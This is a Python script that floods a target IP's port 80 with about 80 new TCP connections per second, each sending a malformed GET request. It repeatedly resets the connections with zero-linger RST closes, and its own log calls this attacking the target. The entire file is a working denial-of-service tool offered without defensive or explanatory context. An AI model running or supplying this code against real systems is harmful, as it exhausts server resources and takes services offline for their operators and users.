import socket
import time
import random
import logging
import struct

def parse_args():
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument("host", type=str, help="Target IP address")
    return parser.parse_args()

def init_socket(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3)
    s.connect((ip, 80))
    # extra carriage returns and line feeds
    request = "GET / HTTP/1.0\r\n\r\n\r\n"
    s.send(request.encode("utf-8"))
    return s

def main():
    args = parse_args()
    ip = args.host
    sockets_per_second = 80
    list_of_sockets = []
    
    logging.info("Attacking %s by opening %s sockets per second.", ip, sockets_per_second)

    iteration = 1
    while iteration <= 1190:
        reset_interval = random.randint(1, 10)
        logging.info("Iteration %d: Will reset sockets in %d seconds.", iteration, reset_interval)
        start_time = time.time()

        while (time.time() - start_time) < reset_interval:
            if iteration > 1190:
                break

            batch_start = time.time()
            created_sockets = 0
            
            while created_sockets < sockets_per_second:
                try:
                    s = init_socket(ip)
                    list_of_sockets.append(s)
                    created_sockets += 1
                except socket.error:
                    pass
            
            elapsed = time.time() - batch_start
            sleep_time = max(0, 1 - elapsed)
            time.sleep(sleep_time)
            iteration += 1

        if iteration > 1190:  
            break

        logging.info("Resetting %d sockets...", len(list_of_sockets))
        for s in list_of_sockets:
            try:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
                s.close()
            except socket.error:
                pass
        list_of_sockets.clear()

    logging.info("Final reset: Closing remaining %d sockets...", len(list_of_sockets))
    for s in list_of_sockets:
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
            s.close()
        except socket.error:
            pass
    list_of_sockets.clear()

if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    main()